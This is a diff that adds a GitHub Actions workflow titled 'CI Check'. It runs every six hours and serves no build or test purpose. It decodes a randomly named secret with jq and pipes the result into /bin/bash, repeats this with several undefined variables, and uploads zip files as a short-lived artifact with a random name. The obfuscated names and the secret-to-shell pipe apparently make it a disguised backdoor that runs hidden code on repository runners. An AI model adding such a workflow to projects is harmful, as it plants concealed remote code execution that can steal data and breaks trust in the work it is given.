@@ -1,0 +1,35 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          qdae7: ${{ secrets.qdae7 }}
+        run: |
+          printf '%s' "$qdae7" | jq -r .s3 | /bin/bash
+          echo $ikut5228 | jq -r .rpbkf1681 | /bin/bash
+          printf '%s' "$zz572" | jq -r .ap9 | /bin/bash
+          printf '%s' "$u66809" | jq -r .nudix25015 | /bin/bash
+          echo $rw7 | jq -r .uzzy90941 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: BGpsCQIF
+          path: "*.zip"
+          retention-days: 1
